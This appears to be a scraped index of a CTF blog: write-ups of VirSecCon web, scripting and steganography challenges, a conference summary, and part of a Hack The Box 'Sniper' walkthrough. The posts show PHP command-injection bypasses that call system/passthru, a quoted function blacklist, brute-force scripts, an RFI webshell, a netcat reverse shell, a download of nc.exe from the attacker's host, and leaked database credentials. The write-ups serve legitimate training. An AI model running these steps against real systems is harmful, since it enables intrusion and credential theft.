dr-xr-xr-x 1 www-data www-data 4096 Apr 2 14:33 . drwxr-xr-x 1 root root 4096 Sep 4 2016 .. -r--r--r-- 1 root root 39 Apr 2 14:32 flag_name_dont_guess_plz -rwxr-xr-x 1 root root 2538 Mar 22 00:49 index.php So got the final flag using system('cat flag_name_dont_guess_plz'); LLS{php_preg_replace_may_be_dangerous} ","date":"2020-04-17","objectID":"/virsecctf_web/:1:11","tags":["linux","virseccon","ctf","webchallenge","SSTI","PhpJuggler"],"title":"VirSecCon CTF \"Web Challenges\"","uri":"/virsecctf_web/"},{"categories":["ctf"],"content":"12. GET Encoded Description [125] I don’t GET this%21 Do you%3F Connect here: http://jh2i.com:50013 Solution:- After visiting the challenge,viewing the source code and robots.txt. I got the dir at robots.txt. then I visited that dir http://jh2i.com:50013/?debug and got the code below. ?php function debug(){ highlight_file(__FILE__); } // I hate these functions, they are so insecure! $blacklist = \"assert|system|passthru|exec|assert|read|open|eval|`|_|file|dir|\\.\\.|\\/\\/|curl|ftp|glob\"; // If you supply GET arguments, process them... // Documentation here: http://php.net/manual/en/reserved.variables.get.php if ( count( $_GET ) \u003e 0 ){ // Check if there are any bad functions in the URL supplied if ( preg_match( \"/$blacklist/i\", $_SERVER['REQUEST_URI'] ) ) { // If there are all, kindly tell them off. ;) // Documentation here: http://php.net/manual/en/reserved.variables.server.php die( \"Go away, hacker! No unsafe functions in \\$_SERVER['REQUEST_URI']!!\" ); }else{ // Otherwise, execute code as a usual debugging interface. // Pull them out of the GET array as `variable=value` format... list( $function, $argument ) = each($_GET); // and call what they supply... // THIS WILL ONLY CALL ONE FUNCTION, SO YOU CAN'T INCLUDE `/?debug` echo(\"\u003cpre\u003e\"); $function($argument); echo(\"\u003c/pre\u003e\"); } } echo(\"\u003cp\u003eMachines hunt for more than humans do.\u003c/p\u003e\"); So I sent a request with url encoding technique you see here ?passthru=cat flag_that_you_could_never_guess.php but not decoded the = This way I solved the challenge. This way I was able to solve all challenges from web category except the last one. I would like to thank all my reader for being with me. Stay upto date to my blog to see more writeups #Stay_Safe #COVID-19 ","date":"2020-04-17","objectID":"/virsecctf_web/:1:12","tags":["linux","virseccon","ctf","webchallenge","SSTI","PhpJuggler"],"title":"VirSecCon CTF \"Web Challenges\"","uri":"/virsecctf_web/"},{"categories":["ctf"],"content":" Here, I will explain about all the challenges that I solved from scriting category.","date":"0001-01-01","objectID":"/virsecctf_scripting/","tags":["linux","virseccon","ctf","scripting","python","selenium","pwn"],"title":"VirSecCon CTF \"Scripting Challenges\"","uri":"/virsecctf_scripting/"},{"categories":["ctf"],"content":"Here, I will explain about all the challenges that I solved from scriting category. ","date":"0001-01-01","objectID":"/virsecctf_scripting/:0:0","tags":["linux","virseccon","ctf","scripting","python","selenium","pwn"],"title":"VirSecCon CTF \"Scripting Challenges\"","uri":"/virsecctf_scripting/"},{"categories":["ctf"],"content":"Introduction Scripting is a programming language for a special run-time that automates the execution of tasks; tasks could alternatively be executed one-by-one by a human operator. We people think there is no any difference in between coding and scripting but there is a saying :- \" All scripting is coding, but not all coding is scripting. \" During VirSecCon CTF there was also Scripting Category which helped me to make my scripting to get the flag. Here I used python scripting and solved the challenges. ","date":"0001-01-01","objectID":"/virsecctf_scripting/:1:0","tags":["linux","virseccon","ctf","scripting","python","selenium","pwn"],"title":"VirSecCon CTF \"Scripting Challenges\"","uri":"/virsecctf_scripting/"},{"categories":["ctf"],"content":"Challenges ","date":"0001-01-01","objectID":"/virsecctf_scripting/:2:0","tags":["linux","virseccon","ctf","scripting","python","selenium","pwn"],"title":"VirSecCon CTF \"Scripting Challenges\"","uri":"/virsecctf_scripting/"},{"categories":["ctf"],"content":"1. 2048 Description [75] cGx6aGVscG1l=\u003e plzhelpme (base64 decode) File: 2048.zip Solution: As challenge is zipped, I unzipped that file and got the 2048 file . root@gr4n173:# cat 2048 Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTVjAxV2JETlhhMUpUVmpBeFYySkVU bGhoTVVwVVZtcEJlRll5U2tWVQpiR2hvVFZWd1ZWWnRjRUpsUmxsNVUydFdWUXBpUjJodlZGWldk MVpXV25SalJVcHNVbXhzTlZVeWRGZFdVWEJwVWpKb2RsWkdXbGRrCk1WcFhWMjVTYWxKVmNITlZi WGh6VGxaVmVXUkdaRmRWV0VKd1ZXcEtiMlJzV2tkWGJHUnJDazFXY0ZoV01qVlRZV3hLVm1OSVRs WmkKV0doNlZHeGFWbVZYVWtkYVJtUldWMFZLZDFaWGNFdGlNbEp6VjJ0a1dHSkhVbkpEYXpGWFkw Wm9WMDFxVmxSWlYzaExWbTFPU1ZScwpXbWtLVjBkb05sWkhlR0ZXYlZaWVZXdGtZVkp0VWxkV01G WkxaREZhV0dORmRHbE5iRXA2VmpKMGExZEhTa2hWYmtwRVlYcEdXRmt3CldtOVdNREZ4Vm14U1ds WXphRXhXYlRGUFUxWlNjd3BYYld0TFZqQmtiMDVzV2tobFIwWlhZbFphV1ZaWGRHdFpWa3AwVld4 a1YwMUcKV2t4YVJFWmhWMGRPUm1SSGJFNWlSWEEyVm1wS01HRXhaRWhUYTJoV1ltdHdSVmxZY0Vk WFJtdDNDbGR0T1ZkTlJFWjRWbTE0VTFkcwpXWHBoUlhoWFlsUkdVRlV4V2xOamQzQllZbGQwVEZa cVFtdGlNRFZ6VjJ0b2JGSXdXbGhaYkZwaFYxWmFXR1JIZEZwV2EzQXdWbGQ0CmExWXdNVWNLVjJ0 NFlWSkZXbWhXTUdSUFVtMVNTR0pGTldsU1dFRXlWbTF3UzAxSFJYaGFSV2hVWVRKb1YxbHRkSGRT Vm14WlkwVmsKV0ZKdGRETkRiR1IwVDFaa1RsSkZXalJXYlRFMFZURmtjd3BYV0hCb1VsaG9XRmxz VWtkVlJsVjRWMnhPYW1RelFsbFpiR1F3VkVaYQpjVkZ0ZEdsTlJGWjZWakowYjJKR1NY........== this indicate the file ASCII text and I tried encoding all many times and I got the flag after 32 decoding. This way I got the 75 points. root@gr4n173:~# cat 2048(32) LCSC{i_hope_you_didnt_use_asciitohex.com} ","date":"0001-01-01","objectID":"/virsecctf_scripting/:2:1","tags":["linux","virseccon","ctf","scripting","python","selenium","pwn"],"title":"VirSecCon CTF \"Scripting Challenges\"","uri":"/virsecctf_scripting/"},{"categories":["ctf"],"content":"2. Quick Run Description [75] You gotta go fast! Download the file below. File: quick_run.zip Solution: As I unzipped that file I got 31 QR-code images so I wrote a simple script in python to decode this image for that I used pyzbar module Python Imaging Library(PIL) . root@gr4n173:~#cat bardecode.py from PIL import Image from pyzbar.pyzbar import decode #!/bin/python3 res = [] for i in range(0,34): img = Image.open(\"quick_run/\"+str(i)+\".png\") data = decode(img) res.append(data[0].data) img.close() print(chr(int(data[0].data))) Then I run the script and got the flag with 75 points added. root@gr4n173:~# python3 bardecode.py L L S { z b a r i m g _ m a k e s _ q r c o d e s _ e a s y } ","date":"0001-01-01","objectID":"/virsecctf_scripting/:2:2","tags":["linux","virseccon","ctf","scripting","python","selenium","pwn"],"title":"VirSecCon CTF \"Scripting Challenges\"","uri":"/virsecctf_scripting/"},{"categories":["ctf"],"content":"3. Pincode Description [75] This service needs a 4 digit pincode to authenticate… can you help me figure it out!?? Connect with: nc jh2i.com 50031 Solution: As the server require 4 digit pincode so only way to enter the digit is from 0000 to 9999 so I wrote a simple script in python. roo@gr4n173:~# cat pincode.py from __future__ import print_function from pwn import * pin = 0 while pin \u003c 9999: print(pin,end=\"\") r = remote('jh2i.com', 50031) r.recvuntil(\":\") r.send(str(\"%04d\" % (pin))) hashi = r.recvline() print(hashi) r.close() if(\"INCORRECT!\" not in hashi): break pin+=1 After 37 step I got the flag and 75 points was added. ...... [*] Closed connection to jh2i.com port 50031 37[+] Opening connection to jh2i.com on port 50031: Done CORRECT! Here is your flag: LLS{for_i_in_0000_to_9999} [*] Closed connection to jh2i.com port 50031 ","date":"0001-01-01","objectID":"/virsecctf_scripting/:2:3","tags":["linux","virseccon","ctf","scripting","python","selenium","pwn"],"title":"VirSecCon CTF \"Scripting Challenges\"","uri":"/virsecctf_scripting/"},{"categories":["ctf"],"content":"4. Loopback Description [100] Hello? Hello? Oh hello! Oh hello! Download the file below. File: lookback.zip Solution: As I unzipped that file I got the loopback.pcap file so I used the tshark tool to analyze the .pcap file and wrote a simple python script to analyze the raw file and finally I got the flag. root@gr4n173:~#tshark -r loopback.pcap -T fields -e data \u003e raw.txt root@gr4n17:~#cat loopback.py #!/bin/python3 #python loopback.py \u003e result.txt from __future__ import print_function import binascii import sys import string data = open(\"raw.txt\",'r').read().splitlines() chars = string.ascii_letters + string.digits + string.punctuation res = '' i=0 for a in data: decoded = a.decode(\"hex\")[8:].strip() try: if(decoded[0] in chars): res+=decoded[0] i+=1 except IndexError as identifier: pass print(res) Flag LLSS{icmp_is_the_protocol_for_me} ","date":"0001-01-01","objectID":"/virsecctf_scripting/:2:4","tags":["linux","virseccon","ctf","scripting","python","selenium","pwn"],"title":"VirSecCon CTF \"Scripting Challenges\"","uri":"/virsecctf_scripting/"},{"categories":["ctf"],"content":"5. Grammer Description [125] It’s only one letter away! Connect with: nc jh2i.com 50012 Solution: As the server ask for flag I made a simple python script to brute-force the correct flag containing alphabet and symbols. root@gr4n173:~#cat grammer.py from __future__ import print_function from pwn import * import string flag = \"LLS{\" r = remote('jh2i.com', 50012) chars = string.ascii_letters + string.digits + string.punctuation print(chars) is_first = True while(\"}\" not in flag): print(\"FLAG = \",flag) #print(\"TRY.. \",end=\"\") if is_first : r.recvuntil(\"\u003e\") for char in chars: is_first = False print(char,end=\"\") r.send(flag + char) lines = r.recvuntil('\u003e').split(\"\\n\") #print(lines) if(\"CORRECT\" in lines[-3]): #print(\" OK \",end=\"\") flag+=char break else: #print(\" FALSE \",end=\"\") pass print(\"\") print(\"FINAL FLAG = \",flag) After running my script I got the flag and 125 points was added. ........ abcdefghijklm FLAG = LLS{bruteforce_with_a_hamm abcde FLAG = LLS{bruteforce_with_a_hamme abcdefghijklmnopqr FLAG = LLS{bruteforce_with_a_hammer abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!\"#$%\u0026'()*+,-./:;\u003c=\u003e?@[\\]^_`{|} FINAL FLAG = LLS{bruteforce_with_a_hammer} [*] Closed connection to jh2i.com port 50012 ","date":"0001-01-01","objectID":"/virsecctf_scripting/:2:5","tags":["linux","virseccon","ctf","scripting","python","selenium","pwn"],"title":"VirSecCon CTF \"Scripting Challenges\"","uri":"/virsecctf_scripting/"},{"categories":["ctf"],"content":"6. CALC-UL8R Description [150] Texas Instruments latest new product: you! Connect with: nc jh2i.com 50003 Solution:- As the challenge name was calculator so I had to enter the answer. But each time I enter the answer question changes randomly so I used the selelnium with a website mathhapa.com. To solve this I wrote a simple python script. from __future__ import print_function from pwn import * from selenium import webdriver from selenium.webdriver.common.keys import Keys from selenium.webdriver.chrome.options import Options import urllib url = \"https://www.mathpapa.com/algebra-calculator.html?q=\" chrome_options = Options() chrome_options.add_argument(\"--headless\") driver = webdriver.Chrome(\"/home/gr4n173/ctfscripting/chromedriver\") #nc jh2i.com 50003 r = remote('jh2i.com', 50003) r.recvline() r.recvline() r.recvline() r.recvline() r.recvline() r.recvline() r.recvline() while True: soal = r.recvline() print(soal) resp = r.recvuntil(\"= \") driver.get(url + urllib.quote(soal.replace(\"e\",\"x\"))); driver.implicitly_wait(30) elements = driver.find_elements_by_css_selector(\"div#solout3 div.vspacediv fmath mn\") text = 0 i=0 for element in elements: if(text==0): text = float(element.text) else: text /= float(element.text) if(text.is_integer()): text = str(int(text)) else: text = str(float(text)) r.send(text) print(\"ANSWER\",text) print(r.recvline()) driver.close() At last this script lend me the flag:- LLS{sympy_to_solve_equations} This way I solved 6 challenges from scripting. Follow my blog to see more writeup of other catageory and I was able to solve more challenge from Web Challenges which writeup is comming soon. Stay tuned. #Stay_safe #COVID-19 ","date":"0001-01-01","objectID":"/virsecctf_scripting/:2:6","tags":["linux","virseccon","ctf","scripting","python","selenium","pwn"],"title":"VirSecCon CTF \"Scripting Challenges\"","uri":"/virsecctf_scripting/"},{"categories":["ctf"],"content":"Here I will explain the challenges that I solved.","date":"2020-04-07","objectID":"/virsecctf_steganograhy/","tags":["linux","VirSecCon","VSCCTF","ctf","steganography"],"title":"VirSecCon CTF \"Steganography Challenges\"","uri":"/virsecctf_steganograhy/"},{"categories":["ctf"],"content":"Here I will explain the about steganography challenges that I solved and tools used. ","date":"2020-04-07","objectID":"/virsecctf_steganograhy/:0:0","tags":["linux","VirSecCon","VSCCTF","ctf","steganography"],"title":"VirSecCon CTF \"Steganography Challenges\"","uri":"/virsecctf_steganograhy/"},{"categories":["ctf"],"content":"Steganography Steganography is the practice of concealing a file, message, image or video within another file, message, video or image. There are many tools that can be used in CTF to solve the steganography challenges such as Steghide, foremost, Stegsolve, Strings, Exiftool, Binwalk, Zsteg, Wavsteg, Stegsnow etc among these I only used 3 tools in VirSecCon CTF. ","date":"2020-04-07","objectID":"/virsecctf_steganograhy/:1:0","tags":["linux","VirSecCon","VSCCTF","ctf","steganography"],"title":"VirSecCon CTF \"Steganography Challenges\"","uri":"/virsecctf_steganograhy/"},{"categories":["ctf"],"content":"1. Stegosaurus Description [70] Scientists are struggling with a new mystery: we thought the dinosaurs were gone, but this one has returned! Hmmm… can you solve this mystery? File: stegosaurus.png Solution: I solved this challenge using stegsolve tool you can download it here root@gr4n173:~$ls stegsolve.jar root@gr4n173:~$java -jar stegsolve.jar then stegsolve was opened. then I got the flag finally and got the 70 points. ","date":"2020-04-07","objectID":"/virsecctf_steganograhy/:1:1","tags":["linux","VirSecCon","VSCCTF","ctf","steganography"],"title":"VirSecCon CTF \"Steganography Challenges\"","uri":"/virsecctf_steganograhy/"},{"categories":["ctf"],"content":"2. Winter Wonderland Description [80] It’s the holiday season! But hmm… they must be hiding something under all that cheer! Download the file below. File: winter_wonderland.txt Solution: root@gr4n173:~# cat winter_wonderland.txt Oh the weather outside is frightful But the fire is so delightful And since we've no place to go Let It Snow! Let It Snow! Let It Snow! It doesn't show signs of stopping And I've bought some corn for popping The lights are turned way down low Let It Snow! Let It Snow! Let It Snow! When we finally kiss goodnight How I'll hate going out in the storm! But if you'll really hold me tight All the way home I'll be warm The fire is slowly dying And, my dear, we're still goodbying But as long as you love me so Let It Snow! Let It Snow! Let It Snow! Oh! It doesn't show signs of stopping And I've bought some corn for popping and The lights are turned way down low Let It Snow! Let It Snow! Let It Snow! All the way home I'll be warm! All the way home I'll be warm! The fire is slowly dying And, my dear, we're still goodbying But as long as you love me so Let It Snow! Let It Snow! Let It Snow! Let It Snow! Let It Snow! Let It Snow! I saw the word snow many times so used stegsnow tool. root@gr4n173:~# stegsnow winter_wonderland.txt LLS{let_it_snow_baby_let_it_reindeer} This way I got the flag and got the 80 points. ","date":"2020-04-07","objectID":"/virsecctf_steganograhy/:1:2","tags":["linux","VirSecCon","VSCCTF","ctf","steganography"],"title":"VirSecCon CTF \"Steganography Challenges\"","uri":"/virsecctf_steganograhy/"},{"categories":["ctf"],"content":"3. Elessbe Description [80] Ah, bonjour mon bon ami! Bienvenue à la capture du drapeau! J’ai entendu dire que vous étiez fan de la stéganographie! Avez-vous déjà entendu parler d’un outil appelé zsteg? Download the file below: File: elessbe.png Solution: As from the challenge name ‘Elessbe’= ‘lsb’ so I used the zsteg tool and got the least significant bits of the file using command below. root@gr4n173:~# zsteg -a elessbe.png file: Apple DiskCopy 4.2 image \\376, 16842496 bytes, 0xff00 tag size, 0xff encoding, 0x0 format b1,bgr,lsb,xy .. text: \"LLS{lsb_est_mon_bon_ami}\" b2,r,lsb,xy .. file: 5View capture file b2,r,msb,xy .. file: VISX image file b2,g,lsb,xy .. file: 5View capture file b2,g,msb,xy .. file: VISX image file b2,b,lsb,xy .. file: 5View capture file b2,b,msb,xy .. file: VISX image file b2,rgb,lsb,xy .. file: 5View capture file b2,rgb,msb,xy .. file: VISX image file b2,bgr,lsb,xy .. file: 5View capture file b2,bgr,msb,xy .. file: VISX image file b4,r,msb,xy .. text: [\"w\" repeated 9 times] b4,g,msb,xy .. text: [\"w\" repeated 12 times] b4,b,msb,xy .. text: [\"w\" repeated 10 times] b4,rgb,msb,xy .. text: [\"w\" repeated 28 times] b4,bgr,msb,xy .. text: [\"w\" repeated 29 times] b8,r,msb,xy .. file: RDI Acoustic Doppler Current Profiler (ADCP) b8,g,msb,xy .. file: RDI Acoustic Doppler Current Profiler (ADCP) b8,b,msb,xy .. file: RDI Acoustic Doppler Current Profiler (ADCP) b8,rgb,msb,xy .. file: RDI Acoustic Doppler Current Profiler (ADCP) b8,bgr,msb,xy .. file: RDI Acoustic Doppler Current Profiler (ADCP) b2,g,lsb,xy,prime .. file: SoftQuad DESC or font file binary b2,g,msb,xy,prime .. file: VISX image file b2,b,lsb,xy,prime .. file: SoftQuad DESC or font file binary b2,b,msb,xy,prime .. file: VISX image file b2,rgb,lsb,xy,prime .. file: 5View capture file b2,rgb,msb,xy,prime .. file: VISX image file b2,bgr,lsb,xy,prime .. file: 5View capture file b2,bgr,msb,xy,prime .. file: VISX image file b4,rgb,msb,xy,prime .. text: [\"w\" repeated 10 times] b4,bgr,msb,xy,prime .. text: [\"w\" repeated 11 times] b8,r,msb,xy,prime .. file: RDI Acoustic Doppler Current Profiler (ADCP) b8,g,msb,xy,prime .. file: RDI Acoustic Doppler Current Profiler (ADCP) b8,b,msb,xy,prime .. file: RDI Acoustic Doppler Current Profiler (ADCP) b8,rgb,msb,xy,prime .. file: RDI Acoustic Doppler Current Profiler (ADCP) b8,bgr,msb,xy,prime .. file: RDI Acoustic Doppler Current Profiler (ADCP) b2,r,msb,yx .. text: [\"U\" repeated 18 times] b2,rgb,msb,yx .. text: [\"U\" repeated 12 times] b4,r,msb,yx .. text: [\"w\" repeated 8 times] b8,rgb,msb,yx .. file: RDI Acoustic Doppler Current Profiler (ADCP) b2,rgb,msb,yx,prime .. text: \"WUUUUUUU\" b4,rgb,msb,yx,prime .. text: [\"w\" repeated 16 times] b2,r,lsb,XY .. file: VISX image file b2,r,msb,XY .. file: 5View capture file b2,g,lsb,XY .. file: VISX image file b2,g,msb,XY .. file: 5View capture file b2,b,lsb,XY .. file: VISX image file b2,b,msb,XY .. file: 5View capture file b2,rgb,lsb,XY .. file: VISX image file b2,rgb,msb,XY .. file: 5View capture file b2,bgr,lsb,XY .. file: VISX image file b2,bgr,msb,XY .. file: 5View capture file b4,r,msb,XY .. text: [\"w\" repeated 28 times] b4,g,msb,XY .. text: [\"w\" repeated 28 times] b4,b,msb,XY .. text: [\"w\" repeated 28 times] b8,g,msb,XY .. text: [\"?\" repeated 8 times] b8,rgb,msb,XY .. text: \"#m\\r\\rCMM3\" b1,r,lsb,XY,prime .. file: MPEG ADTS, layer II, v1, 48 kHz, JntStereo b1,g,lsb,XY,prime .. file: MPEG ADTS, layer II, v1, 64 kbps, JntStereo b2,r,lsb,XY,prime .. file: VISX image file b2,r,msb,XY,prime .. file: SoftQuad DESC or font file binary b2,g,lsb,XY,prime .. file: VISX image file b2,g,msb,XY,prime .. file: SoftQuad DESC or font file binary b2,b,lsb,XY,prime .. file: VISX image file b2,b,msb,XY,prime .. file: SoftQuad DESC or font file binary - version 10922 b2,rgb,lsb,XY,prime .. file: VISX image file b2,rgb,msb,XY,prime .. file: 5View capture file b2,bgr,lsb,XY,prime .. file: VISX image file b2,bgr,msb,XY,prime .. file: 5View capture file b4,b,msb,XY,prime .. text: \"\\\"7233333\" b4,rgb,","date":"2020-04-07","objectID":"/virsecctf_steganograhy/:1:3","tags":["linux","VirSecCon","VSCCTF","ctf","steganography"],"title":"VirSecCon CTF \"Steganography Challenges\"","uri":"/virsecctf_steganograhy/"},{"categories":["ctf"],"content":"Here I will explain about the VirSeconCon and VSCCTF.","date":"2020-04-06","objectID":"/virseccon/","tags":["VirSecCon","VSCCTF","ctf"],"title":"VirSecCon2020","uri":"/virseccon/"},{"categories":["ctf"],"content":"Virtual Security Conference known as VirSecCon2020 and my ranking in VSCCTF. ","date":"2020-04-06","objectID":"/virseccon/:0:0","tags":["VirSecCon","VSCCTF","ctf"],"title":"VirSecCon2020","uri":"/virseccon/"},{"categories":["ctf"],"content":"Introduction As due to the outbreak of the Corona virus that start from late 2019 known as COVID-19every big National as well as International Cyber Security Conference was canceled. So In regard that, two well-renowned hackers NahamSec and Heath Adams(also known as The Cyber Mentor[TCM]) organized a Virtual Security Conference (VirSecCon2020). The conference was conducted free and all the sponsors funds from this conference goes to LLSusa. Conference was full of talks from renowned and most reputed hackers all around the world. ","date":"2020-04-06","objectID":"/virseccon/:1:0","tags":["VirSecCon","VSCCTF","ctf"],"title":"VirSecCon2020","uri":"/virseccon/"},{"categories":["ctf"],"content":"Talks:- TomNomNom:- Bug Bounties With Bash d0nutptr:- Practical Exploitation of Insecure Randomness on V8 zseano:- Unique mindset – Hacking with zseano uraniumhacker:- Protecting your internal assets from enterprise misconfigurations Stokfredrik:- From NOOB to MVH: What does it really take ChloeMessdaghi:- Hacker Rights niden:- Try Harder? Keep Trying! Demystifying the OSCP \u0026 OSCE Certifications b3nac:- Android Hacking erbbysam:- Hostnames: Trials, Tribulations \u0026 VHost Misconfiguration EthicalHacker:- IoT Hacking Basics – Fun with UPnP and a Smart Outlet DawnIsabel:- iOS Recon with Radare2 These talks was on April 4, 2020 in Nahamsec twitch channel. Before these talks i.e on April 3, 2020 they organized a Virtual Security Conference CTF (VSC CTF) which was fully helped and hosted by John Hammond. VSC CTF was live for 29.5 hours in ctf.virseccon.com. VSC CTF was divided into 9 Challenges and among them I was able to solve the below challenges which lend me to secure a rank among top 50 teams rank 46/2513 with points 3720 pts. ","date":"2020-04-06","objectID":"/virseccon/:1:1","tags":["VirSecCon","VSCCTF","ctf"],"title":"VirSecCon2020","uri":"/virseccon/"},{"categories":["ctf"],"content":"Challeges ","date":"2020-04-06","objectID":"/virseccon/:2:0","tags":["VirSecCon","VSCCTF","ctf"],"title":"VirSecCon2020","uri":"/virseccon/"},{"categories":["ctf"],"content":"Steganography: - Stegosaurus - Winter Wonderland - Elessbe ","date":"2020-04-06","objectID":"/virseccon/:2:1","tags":["VirSecCon","VSCCTF","ctf"],"title":"VirSecCon2020","uri":"/virseccon/"},{"categories":["ctf"],"content":"Scripting: - 2048 - Pincode - Quick Run - Grammer - Loopback ","date":"2020-04-06","objectID":"/virseccon/:2:2","tags":["VirSecCon","VSCCTF","ctf"],"title":"VirSecCon2020","uri":"/virseccon/"},{"categories":["ctf"],"content":"Binary: - Count Dracula - Buff The Barque ","date":"2020-04-06","objectID":"/virseccon/:2:3","tags":["VirSecCon","VSCCTF","ctf"],"title":"VirSecCon2020","uri":"/virseccon/"},{"categories":["ctf"],"content":"Forensic: - I Lost My Password - Tragic Number - QUACK ","date":"2020-04-06","objectID":"/virseccon/:2:4","tags":["VirSecCon","VSCCTF","ctf"],"title":"VirSecCon2020","uri":"/virseccon/"},{"categories":["ctf"],"content":"Miscellaneous - Hidden - Linux Kiosk - Catalias - Chasm - MissingCho ","date":"2020-04-06","objectID":"/virseccon/:2:5","tags":["VirSecCon","VSCCTF","ctf"],"title":"VirSecCon2020","uri":"/virseccon/"},{"categories":["ctf"],"content":"Web - 10 Character Web Shell - GET Encoded - Sequelitis - GLHF - PHPJuggler - Magician - JaWT - MASK - Dairy Products - Irregular Expressions - Eyeless ","date":"2020-04-06","objectID":"/virseccon/:2:6","tags":["VirSecCon","VSCCTF","ctf"],"title":"VirSecCon2020","uri":"/virseccon/"},{"categories":["ctf"],"content":"Cryptography - Chief Executive Officer - Polybius - Classic ","date":"2020-04-06","objectID":"/virseccon/:2:7","tags":["VirSecCon","VSCCTF","ctf"],"title":"VirSecCon2020","uri":"/virseccon/"},{"categories":["ctf"],"content":"Warmup ","date":"2020-04-06","objectID":"/virseccon/:2:8","tags":["VirSecCon","VSCCTF","ctf"],"title":"VirSecCon2020","uri":"/virseccon/"},{"categories":["ctf"],"content":"Social Media I will be writting all the writeups of the challenges that I solved besides last two catageory which was the easy challenge. I would especially like tothank host of the VirSecCon CTF John Hammond for providing a such an awesome platform. Stay Updated with my blog. Feedback are really appricated. #COVID-19 #Stay_Safe #quarantine ","date":"2020-04-06","objectID":"/virseccon/:2:9","tags":["VirSecCon","VSCCTF","ctf"],"title":"VirSecCon2020","uri":"/virseccon/"},{"categories":["hackthebox"],"content":"Here I will explain my path for Sniper box from Hack The Box.","date":"2020-03-28","objectID":"/sniper/","tags":["windows","htb","smb",".chm","powershell","nc.exe","webshell","nishang"],"title":"Sniper","uri":"/sniper/"},{"categories":["hackthebox"],"content":"Sniper box was easy box. It falls under windows and medium category. Here I will explain my path for Sniper box from Hack The Box. ","date":"2020-03-28","objectID":"/sniper/:0:0","tags":["windows","htb","smb",".chm","powershell","nc.exe","webshell","nishang"],"title":"Sniper","uri":"/sniper/"},{"categories":["hackthebox"],"content":"HTB:Sniper Sniper box was easy box. It falls under windows and medium category. Here, everything was all about enumeration and webshell upload. I’ll approach this write-up how I solved it, along with the problems that I had to face during this box. At first I obtained the user flag by exploiting RFI using SMB and I got the unprivelege user shell to privelege by using powershell commands and with .chm exploit I got root.txt. I’ll show all my payload (including that didn’t work in initial deployment to get root). ","date":"2020-03-28","objectID":"/sniper/:1:0","tags":["windows","htb","smb",".chm","powershell","nc.exe","webshell","nishang"],"title":"Sniper","uri":"/sniper/"},{"categories":["hackthebox"],"content":"Box Details In the above it’s ip was 10.10.14.151, I added it to /etc/hosts as sniper.htb. Let’s solve this box. ","date":"2020-03-28","objectID":"/sniper/:2:0","tags":["windows","htb","smb",".chm","powershell","nc.exe","webshell","nishang"],"title":"Sniper","uri":"/sniper/"},{"categories":["hackthebox"],"content":"Recon Let’s start with universal port scanner, nmap to see the open ports and port 80 and smb service was opened. # Nmap 7.80 scan initiated Fri Mar 27 21:34:08 2020 as: nmap -sS -sC -sV -Pn -oA nmap.txt 10.10.10.151 Nmap scan report for sniper.htb (10.10.10.151) Host is up (0.41s latency). Not shown: 996 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Sniper Co. 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 7h03m03s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-03-27T22:53:18 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Mar 27 21:35:52 2020 -- 1 IP address (1 host up) scanned in 103.56 seconds ","date":"2020-03-28","objectID":"/sniper/:3:0","tags":["windows","htb","smb",".chm","powershell","nc.exe","webshell","nishang"],"title":"Sniper","uri":"/sniper/"},{"categories":["hackthebox"],"content":"Web Enumeration sniper.htb After I noticed port 80 was opened I visited that site and got this as output. From above, it was a good delivery website. So I checked everypart of the website and found this directory as interesting http://sniper.htb/blog/index.php . Here I found language where I was able to change the language http://sniper.htb/blog/?lang=blog-en.php . This happens due to the RFI (Remote File Inclusion) vulnerability in the webservices. ","date":"2020-03-28","objectID":"/sniper/:3:1","tags":["windows","htb","smb",".chm","powershell","nc.exe","webshell","nishang"],"title":"Sniper","uri":"/sniper/"},{"categories":["hackthebox"],"content":"Webshell Since Sniper had SMB(Server Mail Box) service. So I combined with RFI to get a webshell. For that you can follow this link here. Above you can see the webshell. So, now I used nc to get the actually shell. For that I had to upload nc.exe to the webshell. If you don’t have then you can download from here. Now before uploading that I made a dir named gr4n173 you can see the pic below. then uploaded nc tool to that directory as: ","date":"2020-03-28","objectID":"/sniper/:3:2","tags":["windows","htb","smb",".chm","powershell","nc.exe","webshell","nishang"],"title":"Sniper","uri":"/sniper/"},{"categories":["hackthebox"],"content":"Unprivileged shell Now I setup a listener on and used the command of nc as: Listener: root@gr4n173:~$ nc -lvnp 4444 listening on [any] 4444 ... connect to [10.10.14.11] from (UNKNOWN) [10.10.10.151] 50602 Microsoft Windows [Version 10.0.17763.678] (c) 2018 Microsoft Corporation. All rights reserved. C:\\gr4n173\u003ewhoami whoami nt authority\\iusr Here I was unable to run any commands, so I switched to powershell as: Power shell C:\\gr4n173\u003epowershell powershell Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\gr4n173\u003e Then I found the Chris user. Since I m unprivelege user so no any permission was granted. PS C:\\Users\u003e ls ls Directory: C:\\Users Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 4/9/2019 6:47 AM Administrator d----- 4/11/2019 7:04 AM Chris d-r--- 4/9/2019 6:47 AM Public Now I had to change the user from unprivileged to privileged for that I searched everypart of the dir and found the creds of user chris as Chris:36mEAhz/B8xQ~2VM. PS C:\\inetpub\\wwwroot\\user\u003e more db.php more db.php \u003c?php // Enter your Host, username, password, database below. // I left password empty because i do not set password on localhost. $con = mysqli_connect(\"localhost\",\"dbuser\",\"36mEAhz/B8xQ~2VM\",\"sniper\"); // Check connection if (mysqli_connect_errno()) { echo \"Failed to connect to MySQL: \" . mysqli_connect_error(); } ?\u003e By combining creds and Invoke-Command I got the user shell. Before that I created the folder files and downloaded the nc tool inside. Since it’s 2020 as python2 died so I used python3 server as PS C:\\gr4n173\u003e cd files cd files PS C:\\gr4n173\\files\u003e Invoke-Webrequest -Uri http://10.10.14.11:8000/nc.exe -OutFile nc.exe Invoke-Webrequest -Uri http://10.10.14.11:8000/nc.exe -OutFile nc.exe PS C:\\gr4n173\\files\u003e root@gr4n173:~var/www/html/pub$ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 